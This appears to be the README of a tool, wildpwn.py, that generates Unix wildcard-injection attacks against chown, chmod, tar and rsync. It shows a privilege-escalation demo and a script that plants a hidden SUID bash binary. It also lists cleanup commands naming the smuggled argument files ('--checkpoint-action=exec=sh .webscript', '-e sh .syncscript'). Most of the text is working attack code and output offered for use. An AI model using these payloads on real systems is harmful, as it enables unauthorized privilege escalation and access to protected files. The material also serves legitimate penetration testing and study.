# First things first!
Read: https://www.exploit-db.com/papers/33930/

<br />

# Basic usage

It goes something like this:

```
usage: wildpwn.py [-h] [--file FILE] payload folder

Tool to generate unix wildcard attacks

positional arguments:
  payload      Payload to use: (combined | tar | rsync)
  folder       Where to write the payloads

optional arguments:
  -h, --help   show this help message and exit
  --file FILE  Path to file for taking ownership / change permissions. Use it
               with combined attack only.
```

<br />

## Payload types

  - **combined:** Uses the chown & chmod file reference tricks, described in section 4.1 and 4.2, combined in a single payload.
  - **tar:** Uses the Tar arbitrary command execution trick, described in section 4.3.
  - **rsync:** Uses the Rsync arbitrary command execution trick, described in section 4.4.

<br />

## Usage example
``` bash
$ ls -lh /tmp/very_secret_file
-rw-r--r-- 1 root root 2048 jun 28 21:37 /tmp/very_secret_file

$ ls -lh ./pwn_me/
drwxrwxrwx 2 root root 4,0K jun 28 21:38 .
[...]
-rw-rw-r-- 1 root root    1024 jun 28 21:38 secret_file_1
-rw-rw-r-- 1 root root    1024 jun 28 21:38 secret_file_2
[...]

$ python wildpwn.py --file /tmp/very_secret_file combined ./pwn_me/
[!] Selected payload: combined
[+] Done! Now wait for something like: chown uid:gid *  (or)  chmod [perms] * on ./pwn_me/. Good luck!

[...time passes / some cron gets executed...]

# chmod 000 * (for example)

[...back with the unprivileged user...]

$ ls -lha ./pwn_me/
[...]
-rwxrwxrwx 1 root root    1024 jun 28 21:38 secret_file_1
-rwxrwxrwx 1 root root    1024 jun 28 21:38 secret_file_2
[...]

$ ls -lha /tmp/very_secret_file
-rwxrwxrwx 1 root root 2048 jun 28 21:38 /tmp/very_secret_file
```

<br />

## Bash scripts used on tar/rsync attacks

```sh
#!/bin/sh

# get current user uid / gid
CURR_UID="$(id -u)"
CURR_GID="$(id -g)"

# save file
cat > .cachefile.c << EOF
#include <stdio.h>
int main()
{
setuid($CURR_UID);
setgid($CURR_GID);
execl("/bin/bash", "-bash", NULL);
return 0;
}
EOF

# make folder where the payload will be saved
mkdir .cache
chmod 755 .cache

# compile & give SUID
gcc -w .cachefile.c -o .cache/.cachefile
chmod 4755 .cache/.cachefile
``` 
#### Clean up (tar)
``` sh
# clean up
rm -rf ./'--checkpoint=1'
rm -rf ./'--checkpoint-action=exec=sh .webscript'
rm -rf .webscript
rm -rf .cachefile.c
``` 

#### Clean up (rsync)
``` sh
# clean up
rm -rf ./'-e sh .syncscript'
rm -rf .syncscript
rm -rf .cachefile.c
``` 

<br />

> Feel free to change them!
